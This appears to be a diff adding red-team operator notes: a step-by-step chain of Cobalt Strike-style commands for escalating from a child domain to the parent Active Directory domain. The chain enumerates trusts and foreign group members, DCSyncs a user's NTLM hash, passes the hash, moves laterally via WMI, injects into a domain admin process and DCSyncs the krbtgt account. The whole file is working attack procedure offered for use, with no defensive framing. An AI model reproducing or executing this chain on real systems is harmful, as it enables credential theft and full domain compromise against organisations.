@@ -1,0 +1,36 @@
+powerpick Get-DomainTrust
+
+powerpick Get-DomainForeignUser -Domain CHILD_DOMAIN
+
+powerpick Get-DomainForeignGroupMemeber -Domain PARENT_DOMAIN
+
+powerpick Get-DomainComputer -Ping -Domain PARENT_DOMAIN -Properties dnshostname
+
+powerpick Get-NetLocalGroupMember #a_domain_computer (list from above command)
+
+# Find the Member name in the list from the group foreign member then
+dcsync CHILD_DOMAIN DOMAIN\the_user_from_above_comment #=> this user will have the NTML hash in View > Credentials
+
+#pass the hash of that user
+pth CHILD_DOMAIN\that_username NTLM_Hash
+
+#connect to the domain computer via that session above
+wmi DOMAIN_COMPUTER smb
+
+#note that: SeDebugPrivilege is disabled 
+getsystem
+inject DA_PID # to get the domain admin session 
+
+#DO NOT FORGET TO LiNK the domain computer to new session
+link DOMAIN_COMPUTER
+
+dcsync PARENT_DOMAIN DOMAIN\krbtgt
+
+
+
+
+
+
+
+
+
